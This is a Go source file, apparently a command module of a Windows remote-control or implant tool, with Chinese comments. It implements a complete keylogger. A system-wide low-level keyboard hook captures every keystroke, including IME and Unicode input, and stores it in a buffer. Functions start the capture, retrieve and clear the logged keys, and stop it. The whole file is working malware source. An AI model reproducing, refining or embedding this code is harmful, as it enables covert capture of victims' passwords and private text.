//go:build windows

package commands

import (
	"fmt"
	"sync"
	"syscall"
	"unsafe"
)

// ===== 键盘记录（WH_KEYBOARD_LL 低级钩子） =====

var (
	keylogBuf     []byte
	keylogMu      sync.Mutex
	keylogHook    uintptr
	keylogRunning bool
	keylogThreadID uint32
	// syscall.NewCallback 创建的回调必须保持存活（不能 GC）
	keylogCB = syscall.NewCallback(keylogHookProc)
)

const (
	whKeyLogLL   = 13
	wmKeyDown    = 0x0100
	wmSysKeyDown = 0x0104
	vkShift      = 0x10
	vkCapsLock   = 0x14
	wmQuit       = 0x0012
	maxKeylogBuf = 1024 * 1024 // 缓冲上限 1MB，防长时间未取回导致内存无限增长
)

var (
	keylogUser32     = syscall.NewLazyDLL("user32.dll")
	keylogKernel32   = syscall.NewLazyDLL("kernel32.dll")
	keylogSetHook    = keylogUser32.NewProc("SetWindowsHookExW")
	keylogNextHook   = keylogUser32.NewProc("CallNextHookEx")
	keylogUnhook     = keylogUser32.NewProc("UnhookWindowsHookEx")
	keylogGetMsg     = keylogUser32.NewProc("GetMessageW")
	keylogTransMsg   = keylogUser32.NewProc("TranslateMessage")
	keylogDispMsg    = keylogUser32.NewProc("DispatchMessageW")
	keylogGetKeySt   = keylogUser32.NewProc("GetAsyncKeyState")
	keylogGetTid     = keylogKernel32.NewProc("GetCurrentThreadId")
	keylogPostThMsg  = keylogUser32.NewProc("PostThreadMessageW")
	// 【阶段三-5】IME/Unicode 支持
	keylogToUnicodeEx = keylogUser32.NewProc("ToUnicodeEx")
	keylogGetKeyState = keylogUser32.NewProc("GetKeyboardState")
	keylogGetKbLayout = keylogUser32.NewProc("GetKeyboardLayout")
)

type keyLogLLHookStruct struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

// keylogHookProc 低级键盘钩子回调（被 syscall.NewCallback 桥接）
func keylogHookProc(code int, wParam, lParam uintptr) uintptr {
	if code >= 0 && (wParam == wmKeyDown || wParam == wmSysKeyDown) {
		kb := (*keyLogLLHookStruct)(unsafe.Pointer(lParam))
		shift, _, _ := keylogGetKeySt.Call(vkShift)
		caps, _, _ := keylogGetKeySt.Call(vkCapsLock)
		// 【阶段三-5】优先使用 ToUnicodeEx 获取完整字符（含中文 IME/特殊布局），失败回退 ASCII
		ch := keyLogVkToUnicode(kb.VkCode, kb.ScanCode)
		if ch == "" {
			ch = keyLogVkToChar(kb.VkCode, shift&0x8000 != 0, caps&0x0001 != 0)
		}
		if ch != "" {
			keylogMu.Lock()
			if ch == "[BACKSPACE]" && len(keylogBuf) > 0 {
				// 退格回删最后一个 UTF-8 字符
				for i := len(keylogBuf) - 1; i >= 0; i-- {
					if keylogBuf[i]&0xC0 != 0x80 { // 非连续字节 = 字符起始
						keylogBuf = keylogBuf[:i]
						break
					}
				}
			} else {
				keylogBuf = append(keylogBuf, []byte(ch)...)
			}
			// 缓冲上限：超限时丢弃最旧的一半
			if len(keylogBuf) > maxKeylogBuf {
				drop := len(keylogBuf) - maxKeylogBuf/2
				keylogBuf = append([]byte(nil), keylogBuf[drop:]...)
			}
			keylogMu.Unlock()
		}
	}
	ret, _, _ := keylogNextHook.Call(0, uintptr(code), wParam, lParam)
	return ret
}

// keyLogVkToUnicode 通过 ToUnicodeEx 获取按键对应的 Unicode 字符（支持中文 IME 组合）
func keyLogVkToUnicode(vk, scanCode uint32) string {
	// 获取键盘状态（256 字节）
	state := make([]byte, 256)
	keylogGetKeyState.Call(uintptr(unsafe.Pointer(&state[0])))
	// 获取当前键盘布局
	layout, _, _ := keylogGetKbLayout.Call(0)

	buf := make([]uint16, 8)
	ret, _, _ := keylogToUnicodeEx.Call(
		uintptr(vk), uintptr(scanCode),
		uintptr(unsafe.Pointer(&state[0])),
		uintptr(unsafe.Pointer(&buf[0])),
		8,
		1, // 1 = 清除键盘状态（hook 场景推荐）
		layout,
	)
	if ret <= 0 || int(ret) > len(buf) {
		return ""
	}
	// 过滤控制字符
	s := syscall.UTF16ToString(buf[:ret])
	for _, r := range s {
		if r < 0x20 || r == 0x7F {
			return ""
		}
	}
	return s
}

func keyLogVkToChar(vk uint32, shift, caps bool) string {
	// A-Z
	if vk >= 0x41 && vk <= 0x5A {
		if shift != caps {
			return string(rune(vk))
		}
		return string(rune(vk + 32))
	}
	// 0-9
	if vk >= 0x30 && vk <= 0x39 {
		if shift {
			shifted := ")!@#$%^&*("
			return shifted[vk-0x30 : vk-0x30+1]
		}
		return string(rune(vk))
	}
	switch vk {
	case 0x20:
		return " "
	case 0x0D:
		return "\n"
	case 0x09:
		return "\t"
	case 0x08:
		return "[BACKSPACE]"
	case 0x1B:
		return "[ESC]"
	case 0x0C:
		return "[CLEAR]"
	}
	return ""
}

// StartKeylog 启动键盘记录（低级钩子 + 消息循环）
func StartKeylog() error {
	keylogMu.Lock()
	if keylogRunning {
		keylogMu.Unlock()
		return nil
	}
	keylogBuf = nil
	keylogMu.Unlock()

	hook, _, err := keylogSetHook.Call(whKeyLogLL, keylogCB, 0, 0)
	if hook == 0 {
		return fmt.Errorf("安装键盘钩子失败: %v", err)
	}
	keylogMu.Lock()
	keylogHook = hook
	keylogRunning = true
	keylogMu.Unlock()

	go keylogMsgLoop()
	return nil
}

func keylogMsgLoop() {
	// 记录本消息循环所在 OS 线程 ID，供 Stop 投递 WM_QUIT
	tid, _, _ := keylogGetTid.Call()
	keylogMu.Lock()
	keylogThreadID = uint32(tid)
	keylogMu.Unlock()

	for {
		var msg struct {
			Hwnd    uintptr
			Message uint32
			WParam  uintptr
			LParam  uintptr
			Time    uint32
			Pt      struct{ X, Y int32 }
		}
		r, _, _ := keylogGetMsg.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
		if r == 0 {
			break // WM_QUIT
		}
		keylogTransMsg.Call(uintptr(unsafe.Pointer(&msg)))
		keylogDispMsg.Call(uintptr(unsafe.Pointer(&msg)))
	}

	// 消息循环退出后清理状态
	keylogMu.Lock()
	keylogRunning = false
	keylogHook = 0
	keylogThreadID = 0
	keylogMu.Unlock()
}

// GetKeylog 获取键盘记录缓冲并清空
func GetKeylog() []byte {
	keylogMu.Lock()
	defer keylogMu.Unlock()
	data := keylogBuf
	keylogBuf = nil
	return data
}

// StopKeylog 停止键盘记录
func StopKeylog() error {
	keylogMu.Lock()
	if !keylogRunning {
		keylogMu.Unlock()
		return nil
	}
	if keylogHook != 0 {
		keylogUnhook.Call(keylogHook)
		keylogHook = 0
	}
	keylogRunning = false
	tid := keylogThreadID
	keylogMu.Unlock()

	// 向消息循环线程投递 WM_QUIT，使其退出（修复 Start/Stop 泄漏 goroutine/线程队列）
	if tid != 0 {
		keylogPostThMsg.Call(uintptr(tid), wmQuit, 0, 0)
	}
	return nil
}
